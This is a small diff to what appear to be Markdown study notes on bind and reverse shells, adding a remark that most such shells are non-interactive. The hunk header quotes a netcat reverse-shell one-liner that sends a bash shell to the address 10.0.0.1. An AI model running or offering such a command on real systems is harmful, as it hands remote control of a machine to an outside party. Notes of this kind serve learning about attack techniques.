@@ -71,6 +71,6 @@ nc 10.0.0.1 69 -e "/bin/bash"
 
 and it's done
 
-##### There also the interactive and non-interactive shells and the difference between them is that the interactive can take user inputs the non is not
+##### There also the interactive and non-interactive shells and the difference between them is that the interactive can take user inputs the non is not, and most of the bind and reverse shells are non-interactive
 
 ---
